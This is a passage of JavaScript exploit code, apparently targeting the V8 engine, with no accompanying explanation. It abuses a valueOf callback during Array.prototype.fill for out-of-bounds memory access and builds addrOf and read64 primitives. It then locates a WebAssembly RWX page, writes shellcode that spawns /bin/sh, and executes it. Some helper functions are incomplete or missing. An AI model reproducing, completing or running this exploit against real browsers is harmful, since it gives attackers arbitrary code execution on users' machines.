rn "0x"+ret;
    else return ret;
}


var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]); var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;

arr = [];
acdtql = [];
arr.length = 65536;
iCallback = {valueOf:function(){
    arr.length = 32;
    arr.fill(2.2);
    let arr0 = [1.1,1.1,1.1,1.1];
    acdtql = arr0;
    return 0x2a;
    }
};
x = arr.fill(4.34584737989687770134811077604E-311,0x29,iCallback);
var ab = new Array(0x20);
ab.fill(0,0x20,1,1);

var aaw = new ArrayBuffer(0x20);
aaw[0] = 1.111111;

leak     = Int64.fromDouble(acdtql[5]);
pde_map    = Int64.fromDouble(acdtql[4]);
gb_sto    = Int64.fromDouble(acdtql[6]);
proc_heap  = Int64.fromDouble(acdtql[12]);
function i2f(i)
{
    var x = (new Int64(i)).asDouble();
}
function AddrOf(obj)
{
    acdtql[10] = new Int64(gb_sto-0x100).asDouble();
    ab[1] = obj;
    obj_addr = Int64.fromDouble(arr[3]);
    return obj_addr;
}

function read64(addr)
{
    acdtql[10] = new Int64(addr-0x10).asDouble();
    return ab[0];
}
function i2f2(i)
{
    bigUint64[0] = i;
    return float64[0];
}
var f_addr = AddrOf(f);
console.log(hex(f_addr));
var shared_info_addr = AddrOf(read64(Add(f_addr,0x18)));
console.log(hex(shared_info_addr));
var wasm_exported_func_data_addr = AddrOf(read64(Add(shared_info_addr,0x8)));
console.log(hex(wasm_exported_func_data_addr));
var wasm_instance_addr = AddrOf(read64(Add(wasm_exported_func_data_addr,0x10)));
console.log(wasm_instance_addr);
var rwx_page_addr = AddrOf(read64(Add(wasm_instance_addr,0x80)));
console.log(rwx_page_addr);

var shellcode=[0x2fbb485299583b6an,0x5368732f6e69622fn,0x050f5e5457525f54n];
var data_view = new DataView(aaw);
var backing_store_addr = AddrOf(aaw)+0x20;

acdtql[0x32] = new Int64(rwx_page_addr).asDouble();

data_view.setFloat64(0, i2f2(shellcode[0]), true);
data_view.setFloat64(8, i2f2(shellcode[1]), true);
data_view.setFloat64(16, i2f2(shellcode[2]), true);

f();